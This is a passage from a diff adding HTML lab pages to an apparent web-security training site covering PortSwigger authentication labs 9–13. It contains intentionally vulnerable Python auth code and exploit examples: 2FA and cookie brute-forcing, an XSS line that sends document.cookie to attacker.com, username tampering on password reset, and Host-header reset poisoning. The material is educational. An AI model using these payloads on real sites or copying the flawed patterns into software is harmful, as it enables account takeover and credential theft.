+                        <span class="payload-label">Attack Request</span>
+POST /login2 HTTP/1.1
+Cookie: verify=carlos  # ← Changed to victim!
+Content-Type: application/x-www-form-urlencoded
+
+mfa-code=§0000§  # Brute-force 0000-9999
+                    </div>
+                </div>
+            </div>
+
+            <!-- Lab 9: 2FA Brute-Force -->
+            <div id="2fa-bruteforce" class="lab-content hidden">
+                <div class="lab-header">
+                    <h2><i class="fas fa-hammer"></i> Lab 9: 2FA Bypass via Brute-Force</h2>
+                    <div class="lab-meta">
+                        <div class="meta-item"><i class="fas fa-layer-group"></i><span>PortSwigger Web Security Academy</span></div>
+                        <div class="meta-item"><i class="fas fa-signal"></i><span>Difficulty: Expert</span></div>
+                    </div>
+                    <p class="lab-description">
+                        The 2FA implementation has no rate limiting and logs out users after 2 wrong attempts.
+                        Using macros to automatically re-login, attackers can brute-force the 4-digit code.
+                    </p>
+                </div>
+                <div class="vuln-section">
+                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
+                    <ul class="vuln-list">
+                        <li>2FA code is only 4 digits (10,000 combinations)</li>
+                        <li>User logged out after 2 wrong attempts</li>
+                        <li>No overall rate limiting or lockout</li>
+                        <li>Burp Macros can automate re-login between attempts</li>
+                    </ul>
+                </div>
+                <div class="code-review-section">
+                    <h3 style="margin-bottom: 15px; color: var(--text-primary);"><i class="fas fa-code" style="color: var(--accent-purple);"></i> Vulnerable Code</h3>
+                    <div class="code-container">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>auth.py</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python">@app.route('/login2', methods=['POST'])
+def verify_2fa():
+    code = request.form.get('mfa-code')
+    user = get_current_user()
+
+<span class="vuln-line">    # ❌ Logout after 2 wrong attempts, but no permanent lockout</span>
+<span class="vuln-line">    if user.mfa_attempts >= 2:</span>
+<span class="vuln-line">        session.clear()  # Just logs out</span>
+<span class="vuln-line">        return redirect('/login')</span>
+
+    if user.mfa_code == code:
+        session['2fa_complete'] = True
+        return redirect('/my-account')
+
+<span class="vuln-line">    user.mfa_attempts += 1  # ❌ Resets on re-login!</span>
+    return error('Invalid code')</code></pre>
+                        </div>
+                    </div>
+                </div>
+                <div class="payload-section">
+                    <h3><i class="fas fa-code"></i> Exploitation</h3>
+                    <div class="payload-box">
+                        <span class="payload-label">Burp Macro Setup</span>
+# 1. Create macro: GET /login → POST /login (with creds) → GET /login2
+# 2. Add session handling rule to run macro before each request
+# 3. Intruder: brute-force mfa-code from 0000-9999
+# 4. Macro automatically re-logs in after logout!
+                    </div>
+                </div>
+            </div>
+
+            <!-- Lab 10: Stay-Logged-In Cookie -->
+            <div id="stay-logged-in" class="lab-content hidden">
+                <div class="lab-header">
+                    <h2><i class="fas fa-cookie"></i> Lab 10: Brute-Forcing Stay-Logged-In Cookie</h2>
+                    <div class="lab-meta">
+                        <div class="meta-item"><i class="fas fa-layer-group"></i><span>PortSwigger Web Security Academy</span></div>
+                        <div class="meta-item"><i class="fas fa-signal"></i><span>Difficulty: Practitioner</span></div>
+                    </div>
+                    <p class="lab-description">
+                        The "stay logged in" cookie is constructed from predictable values (username + MD5 password hash).
+                        Attackers can brute-force passwords by generating candidate cookies.
+                    </p>
+                </div>
+                <div class="vuln-section">
+                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
+                    <ul class="vuln-list">
+                        <li>Cookie format: <code>base64(username:md5(password))</code></li>
+                        <li>MD5 is fast to compute and has rainbow tables</li>
+                        <li>Generate cookies for each password guess</li>
+                        <li>Valid cookie grants access without login</li>
+                    </ul>
+                </div>
+                <div class="code-review-section">
+                    <h3 style="margin-bottom: 15px; color: var(--text-primary);"><i class="fas fa-code" style="color: var(--accent-purple);"></i> Vulnerable Code</h3>
+                    <div class="code-container">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>auth.py</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python">def create_remember_cookie(user):
+<span class="vuln-line">    # ❌ Predictable cookie construction</span>
+<span class="vuln-line">    token = f"{user.username}:{hashlib.md5(user.password.encode()).hexdigest()}"</span>
+<span class="vuln-line">    return base64.b64encode(token.encode()).decode()</span>
+
+def verify_remember_cookie(cookie):
+    decoded = base64.b64decode(cookie).decode()
+    username, password_hash = decoded.split(':')
+    user = User.query.filter_by(username=username).first()
+
+<span class="vuln-line">    # ❌ Compares MD5 hash - brute-forceable!</span>
+<span class="vuln-line">    if hashlib.md5(user.password.encode()).hexdigest() == password_hash:</span>
+        return user
+    return None</code></pre>
+                        </div>
+                    </div>
+                </div>
+                <div class="payload-section">
+                    <h3><i class="fas fa-code"></i> Exploitation</h3>
+                    <div class="payload-box">
+                        <span class="payload-label">Cookie Generation Script</span>
+import hashlib, base64
+
+username = "carlos"
+passwords = ["password", "123456", "admin", ...]
+
+for pwd in passwords:
+    md5_hash = hashlib.md5(pwd.encode()).hexdigest()
+    cookie = base64.b64encode(f"{username}:{md5_hash}".encode()).decode()
+    print(cookie)  # Use in Intruder
+                    </div>
+                </div>
+            </div>
+
+            <!-- Lab 11: Offline Password Cracking -->
+            <div id="offline-cracking" class="lab-content hidden">
+                <div class="lab-header">
+                    <h2><i class="fas fa-database"></i> Lab 11: Offline Password Cracking</h2>
+                    <div class="lab-meta">
+                        <div class="meta-item"><i class="fas fa-layer-group"></i><span>PortSwigger Web Security Academy</span></div>
+                        <div class="meta-item"><i class="fas fa-signal"></i><span>Difficulty: Practitioner</span></div>
+                    </div>
+                    <p class="lab-description">
+                        A stay-logged-in cookie containing a password hash can be stolen via XSS.
+                        The weak hash (MD5) can be cracked offline using rainbow tables or hashcat.
+                    </p>
+                </div>
+                <div class="vuln-section">
+                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
+                    <ul class="vuln-list">
+                        <li>Stay-logged-in cookie contains MD5 password hash</li>
+                        <li>XSS vulnerability allows stealing the cookie</li>
+                        <li>MD5 hash can be cracked with rainbow tables instantly</li>
+                        <li>crackstation.net, hashcat, john the ripper</li>
+                    </ul>
+                </div>
+                <div class="code-review-section">
+                    <h3 style="margin-bottom: 15px; color: var(--text-primary);"><i class="fas fa-code" style="color: var(--accent-purple);"></i> Vulnerable Code</h3>
+                    <div class="code-container">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>auth.py</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python"># Cookie stored: base64(carlos:26323c16d5f4dabff3bb136f2460a943)
+# Decoded: carlos:26323c16d5f4dabff3bb136f2460a943
+# MD5 hash easily cracked → "onceuponatime"
+
+<span class="vuln-line">response.set_cookie('stay-logged-in', cookie,</span>
+<span class="vuln-line">                    httponly=False)  # ❌ Accessible via JavaScript!</span></code></pre>
+                        </div>
+                    </div>
+                </div>
+                <div class="payload-section">
+                    <h3><i class="fas fa-code"></i> Exploitation</h3>
+                    <div class="payload-box">
+                        <span class="payload-label">XSS Cookie Stealing</span>
+&lt;script&gt;
+document.location='https://attacker.com/steal?c='+document.cookie
+&lt;/script&gt;
+
+# Captured: stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
+# Decode base64 → carlos:26323c16d5f4dabff3bb136f2460a943
+# Crack MD5 on crackstation.net → "onceuponatime"
+                    </div>
+                </div>
+            </div>
+
+            <!-- Lab 12: Password Reset Broken Logic -->
+            <div id="reset-broken-logic" class="lab-content hidden">
+                <div class="lab-header">
+                    <h2><i class="fas fa-undo"></i> Lab 12: Password Reset Broken Logic</h2>
+                    <div class="lab-meta">
+                        <div class="meta-item"><i class="fas fa-layer-group"></i><span>PortSwigger Web Security Academy</span></div>
+                        <div class="meta-item"><i class="fas fa-signal"></i><span>Difficulty: Apprentice</span></div>
+                    </div>
+                    <p class="lab-description">
+                        The password reset functionality uses a user-controllable parameter to determine
+                        which account's password to reset, allowing attackers to reset any user's password.
+                    </p>
+                </div>
+                <div class="vuln-section">
+                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
+                    <ul class="vuln-list">
+                        <li>Reset form includes username as hidden field</li>
+                        <li>Token validates the reset link, not the target user</li>
+                        <li>Attacker can change username parameter to victim</li>
+                        <li>Sets new password for any account!</li>
+                    </ul>
+                </div>
+                <div class="code-review-section">
+                    <h3 style="margin-bottom: 15px; color: var(--text-primary);"><i class="fas fa-code" style="color: var(--accent-purple);"></i> Vulnerable Code</h3>
+                    <div class="code-container">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>reset.py</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python">@app.route('/reset-password', methods=['POST'])
+def reset_password():
+    token = request.form.get('token')
+<span class="vuln-line">    username = request.form.get('username')  # ❌ User-controlled!</span>
+    new_password = request.form.get('new-password')
+
+<span class="vuln-line">    # ❌ Only validates token, not username association!</span>
+<span class="vuln-line">    if not validate_token(token):</span>
+        return error('Invalid token')
+
+<span class="vuln-line">    user = User.query.filter_by(username=username).first()</span>
+<span class="vuln-line">    user.password = hash_password(new_password)  # ❌ Resets wrong user!</span>
+    db.session.commit()</code></pre>
+                        </div>
+                    </div>
+                </div>
+                <div class="payload-section">
+                    <h3><i class="fas fa-code"></i> Exploitation</h3>
+                    <div class="payload-box">
+                        <span class="payload-label">Attack Request</span>
+POST /reset-password HTTP/1.1
+
+token=valid-token-for-wiener
+username=carlos  # ← Changed to victim!
+new-password=hacked123
+                    </div>
+                </div>
+            </div>
+
+            <!-- Lab 13: Password Reset Poisoning -->
+            <div id="reset-poisoning" class="lab-content hidden">
+                <div class="lab-header">
+                    <h2><i class="fas fa-skull-crossbones"></i> Lab 13: Password Reset Poisoning via Middleware</h2>
+                    <div class="lab-meta">
+                        <div class="meta-item"><i class="fas fa-layer-group"></i><span>PortSwigger Web Security Academy</span></div>
+                        <div class="meta-item"><i class="fas fa-signal"></i><span>Difficulty: Practitioner</span></div>
+                    </div>
+                    <p class="lab-description">
+                        The password reset link is generated using the Host header value.
+                        Attackers can poison the reset link to point to their server and steal tokens.
+                    </p>
+                </div>
+                <div class="vuln-section">
+                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
+                    <ul class="vuln-list">
+                        <li>Reset email contains link like: <code>https://{Host}/reset?token=xxx</code></li>
+                        <li>X-Forwarded-Host header overrides Host header</li>
+                        <li>Attacker sends reset request with malicious Host</li>
+                        <li>Victim clicks link → token sent to attacker!</li>
+                    </ul>
+                </div>
+                <div class="code-review-section">
+                    <h3 style="margin-bottom: 15px; color: var(--text-primary);"><i class="fas fa-code" style="color: var(--accent-purple);"></i> Vulnerable Code</h3>
+                    <div class="code-container">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>reset.py</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python">@app.route('/forgot-password', methods=['POST'])
+def forgot_password():
+    username = request.form.get('username')
+    user = User.query.filter_by(username=username).first()
+
+    token = generate_reset_token(user)
+
+<span class="vuln-line">    # ❌ Uses Host header to build reset URL!</span>
+<span class="vuln-line">    host = request.headers.get('X-Forwarded-Host', request.host)</span>
+<span class="vuln-line">    reset_url = f"https://{host}/reset?token={token}"</span>
+
+    send_email(user.email, f"Reset your password: {reset_url}")
+    return success('Password reset email sent')</code></pre>
+                        </div>
+                    </div>
+                </div>
+                <div class="payload-section">
+                    <h3><i class="fas fa-code"></i> Exploitation</h3>
+                    <div class="payload-box">
+                        <span class="payload-label">Poisoned Request</span>
+POST /forgot-password HTTP/1.1
+Host: vulnerable-website.com
+X-Forwarded-Host: attacker.com  # ← Poisoned!
+Content-Type: application/x-www-form-urlencoded
+
+username=carlos
+
+# Victim receives email with:
+# https://attacker.com/reset?token=secret-token
+# When clicked, token is sent to attacker's server!
+                    </div>
+                </div>
+            </div>
+
             <!-- Lab 14: Password Brute-force via Password Change -->
             <div id="password-change-bruteforce" class="lab-content">
                 <div class="lab-header">
